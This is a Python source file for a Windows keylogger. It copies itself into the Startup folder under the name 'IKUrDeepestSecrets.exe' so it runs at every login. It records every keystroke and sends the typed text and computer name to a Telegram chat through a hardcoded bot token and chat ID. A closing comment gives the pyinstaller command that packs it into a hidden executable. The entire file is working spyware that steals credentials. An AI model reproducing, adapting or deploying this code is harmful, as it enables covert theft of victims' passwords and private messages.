import keyboard as key
import urllib.request
import time as tm
import json as js
import telepot
import sys
import os

TOKEN_AriBot = '1837829826:AAFqQME7FXnmwz1OkCp3i_LAQPwyyAvaXAM'
CHAT_ID = '-1001391690431'

bot = telepot.Bot(TOKEN_AriBot)

path = f"{os.environ['APPDATA']}\Microsoft\Windows\Start Menu\Programs\Startup"
file_name = "IKUrDeepestSecrets.exe"

def copyfile():
    if file_name not in os.listdir(path):
        os.popen(f'copy "{sys.argv[0]}" "{path}\\{file_name}"')

def start_rec():
    _ = key.start_recording()

def stop_rec():
    actions = key.stop_recording()
    text_list = [x if x != "" else "§" for x in list(key.get_typed_strings(actions))]
    text = "".join(text_list)
    return " ".join([action.name + ("↑" if action.event_type == "up" else "↓") for action in actions]), text

def on_enter_pressed():
    actions_list, text = stop_rec()
    start_rec()
    if not can():
        return
    msg = f"{user}\n{text}\n\n{actions_list}"
    bot.sendMessage(CHAT_ID, msg)

def can():
    pinned = bot.getChat(CHAT_ID)["pinned_message"]
    if pinned == None: return False
    pinned = js.loads(("{"+pinned["text"]+"}").replace("[", '["').replace("]", '"]').replace(", ", '", "').replace("]\n", "],\n"))
    return not user in pinned["blocked"] + pinned["banned"]

quitt = False
def QUIT():
    global quitt
    quitt = True
_ = key.add_hotkey("ctrl+alt+shift+e", QUIT)

copyfile()

connection = 1
while connection != 0:
    try:
        urllib.request.urlopen("http://www.google.com")
        connection = 0
    except:
        connection += 1
        tm.sleep(60)
        if connection == 10:
            QUIT()

user = os.environ.get("COMPUTERNAME") if os.environ.get("COMPUTERNAME") != None else os.getlogin()

start_rec()

while not quitt:
    key.wait("enter")
    on_enter_pressed()

# cd "C:\ric\Python\MyProg\prog(idk2) (keyLogger)\"
# pyinstaller -w --onefile "KeyLog.py"